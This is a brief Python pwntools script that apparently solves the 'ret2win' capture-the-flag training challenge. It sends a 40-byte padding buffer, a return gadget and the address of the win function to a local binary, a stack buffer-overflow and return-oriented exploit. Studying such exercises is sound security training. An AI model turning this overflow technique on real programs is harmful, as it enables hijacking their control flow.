from pwn import *

context.bits = 64
ret = p64(0x400755)
ret2win = p64(0x400756)
payload = b'A' * 40 + ret + ret2win
p = process("./ret2win")
p.sendline(payload)
print(p.recvall().decode())
